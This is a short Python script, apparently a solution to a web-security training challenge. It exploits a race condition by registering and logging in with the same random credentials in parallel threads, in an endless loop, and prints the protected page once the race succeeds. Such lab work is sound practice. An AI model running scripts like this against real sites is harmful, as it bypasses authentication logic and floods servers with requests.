import requests
import random
import time
from threading import Thread
import uuid

URL= "http://meta.training.jinblack.it"


def registration(u,p):
	url= "%s/register.php" % (URL,)
	payload={"username":u, "password_1":p,"password_2":p,"reg_user":"",} 
	r=requests.post(url,data=payload)
	if "Registration Completed!" not in r.text:
		print("REGISTRATION IS DEAD")
def login(u,p):
	url= "%s/login.php" % (URL,)
	payload={"username":u, "password":p,"log_user":""} 
	r=requests.post(url,data=payload)
	if "Login Completed!" not in r.text:
		print("LOGIN IS DEAD")
		return
	else:
		cookies=dict(PHPSESSID=r.cookies['PHPSESSID'])
		print(cookies)
		url = 'http://meta.training.jinblack.it/index.php'
		r = requests.get(url, cookies=cookies)
		if len(r.text)<2810:
			print("TOO BAD")
		else:
			print(r.text)
while True:
	u=uuid.uuid4()
	p=u
	t_reg=Thread(target=registration,args=[u,p])
	t_log=Thread(target=login,args=[u,p])
	t_reg.start()
	t_log.start()
	time.sleep(0.1)

